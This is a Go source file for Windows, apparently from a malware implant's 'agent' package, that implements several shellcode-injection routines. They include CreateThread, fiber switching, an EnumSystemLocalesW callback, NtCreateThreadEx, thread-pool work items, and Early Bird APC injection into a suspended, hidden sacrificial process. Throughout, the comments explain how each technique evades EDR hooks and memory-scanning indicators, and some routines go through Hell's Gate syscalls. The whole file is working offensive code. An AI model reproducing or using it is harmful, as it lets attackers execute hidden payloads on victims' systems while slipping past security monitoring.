//go:build windows

package agent

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32                    = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                       = windows.NewLazySystemDLL("ntdll.dll")
	procCreateThread            = kernel32.NewProc("CreateThread")
	procConvertToFiber          = kernel32.NewProc("ConvertThreadToFiber")
	procCreateFiber             = kernel32.NewProc("CreateFiber")
	procSwitchToFiber           = kernel32.NewProc("SwitchToFiber")
	procEnumSysLocales          = kernel32.NewProc("EnumSystemLocalesW")
	procNtCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
	procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	procRtlQueueWorkItem        = ntdll.NewProc("RtlQueueWorkItem")
	// Early Bird APC — NtQueueApcThread / NtResumeThread
	// (NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection, NtClose
	//  are declared in inject_evasive_windows.go)
	procNtQueueApcThread = ntdll.NewProc("NtQueueApcThread")
	procNtResumeThread   = ntdll.NewProc("NtResumeThread")
)

func injectShellcode(sc []byte) error {
	if SacrificialProc != "" {
		return injectSacrificial(sc, SacrificialProc)
	}
	switch InjectMethod {
	case "fiber":
		return injectFiber(sc)
	case "callback":
		return injectCallback(sc)
	case "ntthread":
		return injectNtThread(sc)
	case "thread":
		return injectThread(sc)
	default:
		// Best available: section dual-map (no VirtualAlloc, no RW→RX) +
		// RtlQueueWorkItem (no CreateThread pointing at non-image-backed addr).
		return injectThreadPool(sc)
	}
}

// allocRX allocates memory via ntdll (bypasses kernel32 hooks), copies shellcode,
// then flips RW → RX so the page is never PAGE_EXECUTE_READWRITE.
func allocRX(sc []byte) (uintptr, error) {
	var base uintptr
	size := uintptr(len(sc))

	// NtAllocateVirtualMemory via Hell's Gate: clean SSN + spoofed call-stack.
	if err := hgAllocateVirtualMemory(windows.CurrentProcess(), &base, &size,
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE); err != nil {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(base)), len(sc)), sc)

	// Flip to RX via Hell's Gate.
	var old uint32
	sz := uintptr(len(sc))
	if err := ntProtectEx(windows.CurrentProcess(), base, sz, windows.PAGE_EXECUTE_READ, &old); err != nil {
		return 0, fmt.Errorf("NtProtectVirtualMemory: %w", err)
	}
	return base, nil
}

// injectThread — CreateThread (highest compat, most detected)
func injectThread(sc []byte) error {
	addr, err := allocRX(sc)
	if err != nil {
		return err
	}
	r, _, e := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if r == 0 {
		return e
	}
	windows.CloseHandle(windows.Handle(r))
	return nil
}

// injectFiber — ConvertThreadToFiber + CreateFiber + SwitchToFiber (low detection)
func injectFiber(sc []byte) error {
	addr, err := allocRX(sc)
	if err != nil {
		return err
	}
	mainFiber, _, _ := procConvertToFiber.Call(0)
	if mainFiber == 0 {
		// Already a fiber or failed — fall back to thread
		return injectThread(sc)
	}
	scFiber, _, _ := procCreateFiber.Call(0, addr, 0)
	if scFiber == 0 {
		return fmt.Errorf("CreateFiber failed")
	}
	// SwitchToFiber is blocking in this goroutine — call in a new OS thread
	go func() {
		procSwitchToFiber.Call(scFiber)
	}()
	return nil
}

// injectCallback — EnumSystemLocalesW uses shellcode addr as callback (no new thread API call)
func injectCallback(sc []byte) error {
	addr, err := allocRX(sc)
	if err != nil {
		return err
	}
	go func() {
		// EnumSystemLocalesW(callback, flags) — callback is called for each locale
		// shellcode runs as the callback; it likely never returns, so go routine stays
		procEnumSysLocales.Call(addr, 0)
	}()
	return nil
}

// injectSacrificial — Early Bird APC via NtCreateSection / NtMapViewOfSection.
//
// Why this is OPSEC vs the classic approach:
//   - No VirtualAllocEx / WriteProcessMemory / CreateRemoteThread (all hooked by EDRs)
//   - Shared memory section: shellcode never crosses the process boundary via a write call
//   - APC queued while thread is still suspended → fires before EDR DLL is loaded,
//     before the process entry point ever runs (true "Early Bird")
//   - Page is never RWX: local map is RW (write), remote map is RX (execute)
func injectSacrificial(sc []byte, procPath string) error {
	pathPtr, err := windows.UTF16PtrFromString(procPath)
	if err != nil {
		return fmt.Errorf("sacrificial path: %w", err)
	}

	si := windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := windows.ProcessInformation{}

	// Spawn suspended + hidden window.
	const createFlags = windows.CREATE_SUSPENDED | 0x08000000 // CREATE_NO_WINDOW
	if err := windows.CreateProcess(pathPtr, nil, nil, nil, false, createFlags, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", procPath, err)
	}
	hProc := pi.Process
	hMainThread := pi.Thread
	defer func() {
		windows.CloseHandle(hMainThread)
		windows.CloseHandle(hProc)
	}()

	// ── 1. NtCreateSection — anonymous section backed by page-file ───────────
	// SEC_COMMIT (0x8000000) + PAGE_EXECUTE_READWRITE lets us map it with
	// different protections in each process: RW locally (write), RX remotely.
	var hSection uintptr
	maxSize := uint64(len(sc))
	r, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0x000F001F, // SECTION_ALL_ACCESS
		0,          // ObjectAttributes = NULL → anonymous
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
		0x8000000, // SEC_COMMIT
		0,
	)
	if r != 0 {
		windows.TerminateProcess(hProc, 1)
		return fmt.Errorf("NtCreateSection: 0x%x", r)
	}
	defer procNtClose.Call(hSection)

	// ── 2. Map into current process as RW → write shellcode ──────────────────
	var localBase uintptr
	viewSize := uintptr(0)
	r, _, _ = procNtMapViewOfSection.Call(
		hSection,
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		1, // ViewShare
		0,
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		windows.TerminateProcess(hProc, 1)
		return fmt.Errorf("NtMapViewOfSection (local): 0x%x", r)
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(sc)), sc)
	// Unmap local view — shellcode now lives only in the section object.
	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localBase)

	// ── 3. Map into remote process as RX ─────────────────────────────────────
	var remoteBase uintptr
	viewSize = uintptr(0)
	r, _, _ = procNtMapViewOfSection.Call(
		hSection,
		uintptr(hProc),
		uintptr(unsafe.Pointer(&remoteBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		1, // ViewShare
		0,
		uintptr(windows.PAGE_EXECUTE_READ),
	)
	if r != 0 {
		windows.TerminateProcess(hProc, 1)
		return fmt.Errorf("NtMapViewOfSection (remote): 0x%x", r)
	}

	// ── 4. Queue APC on the suspended main thread (Early Bird) ───────────────
	// The APC fires at the very first alertable wait — before ntdll's LdrInitialize
	// returns and before any EDR DLL gets a chance to hook the process.
	r, _, _ = procNtQueueApcThread.Call(
		uintptr(hMainThread),
		remoteBase, // APC routine = shellcode
		0, 0, 0,
	)
	if r != 0 {
		windows.TerminateProcess(hProc, 1)
		return fmt.Errorf("NtQueueApcThread: 0x%x", r)
	}

	// ── 5. Resume — shellcode runs before the process entry point ────────────
	var prevCount uint32
	procNtResumeThread.Call(uintptr(hMainThread), uintptr(unsafe.Pointer(&prevCount)))
	return nil
}

// allocSection maps shellcode via NtCreateSection + dual NtMapViewOfSection.
//
// Why this beats allocRX:
//   - No NtAllocateVirtualMemory call — no "private anonymous committed memory" IOC
//   - The RX view was NEVER writable at that address (written via separate RW mapping)
//   - Memory appears as "Mapped" (section-backed) in VAD, not "Private" heap
//   - Both syscalls use indirect stubs (bypass ntdll hooks)
func allocSection(sc []byte) (uintptr, error) {
	scSize := uintptr(len(sc))
	maxSize := int64(scSize)

	var hSection uintptr
	if err := ntCreateSectionEx(&hSection, SECTION_ALL_ACCESS, maxSize,
		windows.PAGE_EXECUTE_READWRITE, SEC_COMMIT); err != nil {
		return 0, err
	}
	defer procNtClose.Call(hSection)

	// RW view → write shellcode → unmap (this address is never executed)
	var rwBase uintptr
	rwSize := scSize
	if err := ntMapViewEx(hSection, &rwBase, &rwSize, windows.PAGE_READWRITE); err != nil {
		return 0, err
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(rwBase)), len(sc)), sc)
	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), rwBase)

	// RX view — shellcode executes from here; this address was never writable
	var rxBase uintptr
	rxSize := scSize
	if err := ntMapViewEx(hSection, &rxBase, &rxSize, windows.PAGE_EXECUTE_READ); err != nil {
		return 0, err
	}
	return rxBase, nil
}

// injectThreadPool executes shellcode via RtlQueueWorkItem.
//
// Why this beats CreateThread:
//   - No CreateThread/NtCreateThreadEx API call
//   - The new thread starts in ntdll!TppWorkerThread (image-backed), not shellcode
//   - The call from TppWorkerThread → shellcode is via a work-item function pointer,
//     same pattern as any legitimate thread pool callback
func injectThreadPool(sc []byte) error {
	addr, err := allocSection(sc)
	if err != nil {
		// fallback to NtAllocateVirtualMemory path if section fails
		addr, err = allocRX(sc)
		if err != nil {
			return err
		}
	}
	// RtlQueueWorkItem(Function, Context, Flags=0)
	r, _, _ := procRtlQueueWorkItem.Call(addr, 0, 0)
	if r != 0 {
		return fmt.Errorf("RtlQueueWorkItem: 0x%X", r)
	}
	return nil
}

// injectNtThread — NtCreateThreadEx (bypasses kernel32 hooks, medium detection)
func injectNtThread(sc []byte) error {
	addr, err := allocRX(sc)
	if err != nil {
		return err
	}
	th, err := hgCreateThreadEx(windows.CurrentProcess(), addr, 0)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	windows.CloseHandle(th)
	return nil
}
